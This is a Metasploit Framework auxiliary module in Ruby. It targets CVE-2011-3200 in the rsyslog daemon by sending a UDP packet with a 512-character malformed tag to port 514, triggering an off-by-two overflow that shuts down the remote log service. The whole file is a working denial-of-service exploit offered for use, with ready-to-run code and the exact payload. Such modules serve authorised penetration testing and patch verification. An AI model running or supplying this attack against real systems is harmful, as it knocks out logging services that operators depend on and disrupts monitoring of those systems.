##
# $Id: rsyslog_long_tag.rb 13971 2011-10-17 04:20:53Z todb $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Udp
	include Msf::Auxiliary::Dos

	def initialize
		super(
			'Name'        => 'rsyslog Long Tag Off-By-Two DoS',
			'Description' => %q{
					This module triggers an off-by-two overflow in the
				rsyslog daemon. This flaw is unlikely to yield code execution
				but is effective at shutting down a remote log daemon. This bug
				was introduced in version 4.6.0 and corrected in 4.6.8/5.8.5.
				Compiler differences may prevent this bug from causing any
				noticeable result on many systems (RHEL6 is affected).
			},
			'Author'      => 'hdm',
			'License'     => MSF_LICENSE,
			'Version'     => '$Revision: 13971 $',
			'References'  =>
				[
					[ 'CVE', '2011-3200'],
					[ 'URL', 'http://www.rsyslog.com/potential-dos-with-malformed-tag/' ],
					[ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=727644' ],
				],
			'DisclosureDate' => 'Sep 01 2011')

		register_options(
			[
				Opt::RPORT(514)
			])
	end

	def run
		connect_udp
		pkt = "<174>" + ("#" * 512) + ":"
		print_status("Sending message containing a malformed RFC3164 tag to #{rhost}")
		udp_sock.put(pkt)
		disconnect_udp
	end
end
